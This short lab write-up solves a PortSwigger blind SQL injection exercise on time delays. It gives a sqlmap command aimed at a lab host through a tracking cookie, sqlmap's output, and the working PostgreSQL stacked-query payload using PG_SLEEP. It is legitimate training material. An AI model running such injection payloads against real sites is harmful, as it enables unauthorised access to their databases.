# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

## Exploit

`sqlmap -u https://0aa2007a045965b6842b956000a10022.web-security-academy.net/ --cookie="TrackingId=vu7Z0cEV36Rp6LdJ" --level=2`

```
Parameter: TrackingId (Cookie)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: TrackingId=vu7Z0cEV36Rp6LdJ';SELECT PG_SLEEP(5)--
```

```sql
TrackingId=vu7Z0cEV36Rp6LdJ';SELECT PG_SLEEP(5)--
```